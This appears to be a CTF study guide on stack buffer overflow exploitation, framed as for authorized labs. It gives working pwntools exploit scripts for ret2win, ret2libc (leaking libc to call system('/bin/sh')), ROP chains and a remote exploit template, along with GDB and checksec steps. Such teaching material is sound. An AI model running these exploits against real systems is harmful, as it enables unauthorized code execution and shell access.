# Buffer Overflow Guide

Use this for authorized CTF/lab binaries where input overwrites stack memory, changes the instruction pointer, or controls a saved return address. This guide sits between reverse engineering and binary exploitation: first understand the binary, then prove control, then build the smallest exploit that solves the challenge.

## When To Use

Consider this branch when you see:

- C/C++ ELF or PE binary with unsafe input functions
- `gets`, `strcpy`, `scanf("%s")`, `read` into a fixed buffer, or custom copy loops
- crash after long input
- `Segmentation fault` after pattern input
- `checksec` shows weak mitigations
- challenge category is `Binary Exploitation`, `pwn`, `buffer overflow`, `ret2win`, `ROP`, or `ret2libc`

Do not start here for pure crackmes, byte transforms, Java/APK checks, or WebAssembly validation unless the challenge clearly becomes native memory corruption.

## 1. Triage

```bash
file ./vuln
checksec --file=./vuln
strings -n 8 ./vuln
./vuln
```

Record:

- architecture: `i386`, `amd64`, ARM, etc.
- endian and bit width
- stripped or non-stripped
- NX enabled or disabled
- stack canary present or absent
- PIE enabled or disabled
- RELRO level

Decision points:

- no canary, no PIE, NX disabled -> classic stack shellcode may work in old labs
- no canary, no PIE, NX enabled -> ret2win or simple ROP is likely
- PIE enabled -> need leak or known runtime address
- canary enabled -> need leak, overwrite avoidance, or different bug
- full RELRO -> GOT overwrite is usually not the path

## 2. Crash Proof

Start with a controlled local crash.

```bash
python3 - <<'PY'
print("A" * 200)
PY
```

Run in GDB:

```bash
gdb ./vuln
run
```

Paste or pipe the long input. Confirm whether the instruction pointer, stack pointer, or nearby stack memory contains your pattern.

Useful GDB checks:

```gdb
info registers
x/32gx $rsp
x/32wx $esp
bt
```

Use `$rip/$rsp` for amd64 and `$eip/$esp` for i386.

## 3. Find The Offset

Use a cyclic pattern instead of guessing padding length.

```bash
pwn cyclic 300
pwn cyclic 300 > pattern.txt
```

Run with the pattern, then inspect the overwritten instruction pointer or stack value.

```gdb
run < pattern.txt
info registers
```

Find the offset:

```bash
pwn cyclic -l 0x6161616c
```

In Python:

```python
from pwn import cyclic, cyclic_find

pattern = cyclic(300)
print(cyclic_find(0x6161616c))
```

For amd64, the saved return address may be visible at `$rsp` after the crash even if `$rip` does not directly contain the cyclic value.

## 4. Confirm Control

Replace the return address with a recognizable marker.

```python
from pwn import *

offset = 72
payload = b"A" * offset
payload += p64(0x4242424242424242)
print(payload)
```

Use `p32()` for 32-bit targets and `p64()` for 64-bit targets. If the process crashes trying to jump to your marker, you control the return path.

## 5. Ret2win

Use this when the binary contains a useful function such as `win`, `flag`, `print_flag`, or `get_shell`.

Find symbols:

```bash
nm -an ./vuln | grep -Ei 'win|flag|shell'
objdump -d ./vuln | grep -Ei 'win|flag|shell'
```

Basic payload:

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
offset = 72

payload = flat(
    b"A" * offset,
    exe.symbols["win"],
)

p = process(exe.path)
p.sendline(payload)
p.interactive()
```

On amd64, stack alignment can matter. If a direct jump fails inside libc or before a call, try a single `ret` gadget before `win`.

```python
rop = ROP(exe)
payload = flat(
    b"A" * offset,
    rop.find_gadget(["ret"]).address,
    exe.symbols["win"],
)
```

## 6. Shellcode Path

Use only in old-style labs when NX is disabled and the stack is executable.

Decision checks:

- `checksec` says `NX disabled`
- no canary or canary bypass already solved
- stack address is predictable enough for the lab

High-level flow:

1. Put a NOP sled and shellcode in the buffer.
2. Overwrite return address with an address into the sled.
3. If ASLR interferes in a local VM/lab, use the challenge-provided constraints or repeat attempts only where the lab expects it.

Prefer ret2win or ROP when NX is enabled.

## 7. Ret2libc

Use when NX is enabled and there is no easy `win` function, but you can call libc functions.

Typical goal:

- leak a libc address
- calculate libc base
- call `system("/bin/sh")`

Common leak target:

```python
puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]
main = exe.symbols["main"]
```

High-level pwntools structure:

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(exe)
offset = 72

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload = flat(
    b"A" * offset,
    pop_rdi,
    exe.got["puts"],
    exe.plt["puts"],
    exe.symbols["main"],
)

p = process(exe.path)
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.symbols["system"],
)

p.sendline(payload)
p.interactive()
```

Adapt reads/parsing to the real program output. If PIE is enabled, leak a binary address or use an info leak first.

## 8. ROP Chain Notes

Use ROP when you need to call functions with controlled arguments or chain multiple calls.

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
ropper --file ./vuln --search "pop rdi"
```

amd64 calling convention reminders:

- first arg: `rdi`
- second arg: `rsi`
- third arg: `rdx`
- return address should be 16-byte stack aligned before some libc calls

i386 reminder:

- arguments are usually placed on the stack after the return address

## 9. Remote Exploit Template

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
context.log_level = "info"

HOST = "challenge.host"
PORT = 31337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)

offset = 72
payload = flat(
    b"A" * offset,
    exe.symbols.get("win", 0x401196),
)

p = start()
p.sendlineafter(b"> ", payload)
p.interactive()
```

Keep local and remote paths in one script so the final solve is repeatable.

## 10. Debugging Checklist

If the exploit fails:

- verify architecture and use `p32` vs `p64`
- re-check the offset after changing input format
- inspect whether newline truncates or changes payload
- check bad bytes such as `\x00`, `\x0a`, or spaces
- verify PIE and ASLR assumptions
- align stack with a `ret` gadget on amd64
- confirm the binary and libc match remote files
- check whether input is read by `gets`, `fgets`, `scanf`, `read`, or menu logic

## 11. Study Use Cases

- [Buffer overflow examples](../references/Challenge%20Use%20Cases.md#buffer-overflow)
- [GDB and assembly examples](../references/Challenge%20Use%20Cases.md#gdb-and-assembly)
- [Python solver scripting examples](../references/Challenge%20Use%20Cases.md#python-solver-scripting)
